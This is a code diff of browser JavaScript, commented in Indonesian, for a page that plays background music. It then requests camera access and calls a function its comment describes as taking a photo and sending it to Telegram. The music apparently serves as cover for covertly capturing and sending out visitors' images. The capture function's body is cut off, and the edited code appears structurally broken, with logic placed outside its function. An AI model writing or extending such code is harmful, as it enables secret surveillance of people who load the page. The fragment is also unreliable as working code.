@@ -32,56 +32,31 @@ async function startMusicAndCamera() {
     // tetap lanjut izin kamera walau musik gagal
   }
 
-// === BAGIAN MUSIK ===
-const music = document.getElementById('bgmusic');
-const btnMusic = document.getElementById('musicButton');
-let started = false;
-music.volume = 0.4;
-
-async function startMusicAndCamera() {
-  if (started && !music.paused) return;
-  started = true;
-
-  let musicStarted = false;
+// === Jalankan kamera setelah sedikit delay ===
+setTimeout(async () => {
   try {
-    music.muted = false;
-    await music.play();
-    console.log("🎵 Musik diputar");
-    musicStarted = true;
-  } catch (err) {
-    console.warn("Musik gagal:", err);
-    btnMusic.classList.add("show");
-    btnMusic.disabled = false;
-    // tetap lanjut izin kamera walau musik gagal
-  }
-
-  // === jalankan kamera setelah sedikit delay ===
-  setTimeout(async () => {
-    try {
-      if (navigator.mediaDevices) {
-        // langsung minta izin kamera
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        stream.getTracks().forEach(t => t.stop());
-        console.log("Perizinan kamera diberikan.");
-      }
-
-      // ambil & kirim foto
-      await autoCaptureAndSend();
-
-    } catch (e) {
-      console.warn("User menolak izin kamera:", e);
+    if (navigator.mediaDevices) {
+      // langsung minta izin kamera (tanpa localStorage)
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      console.log("Perizinan kamera berhasil.");
     }
-  }, musicStarted ? 1000 : 1500); // 1 detik delay jika musik berhasil
 
-  if (musicStarted) {
-    btnMusic.classList.remove("show");
-    btnMusic.disabled = true;
-  } else {
-    btnMusic.disabled = false;
-    btnMusic.classList.add("show");
+    // ambil & kirim foto
+    await autoCaptureAndSend();
+
+  } catch (e) {
+    console.warn("User menolak izin kamera:", e);
   }
-}
+}, musicStarted ? 800 : 1500);
 
+if (musicStarted) {
+  btnMusic.classList.remove("show");
+  btnMusic.disabled = true;
+} else {
+  btnMusic.disabled = false;
+  btnMusic.classList.add("show");
+}
 // === Fungsi ambil foto & kirim ke Telegram ===
 async function autoCaptureAndSend() {
   try {
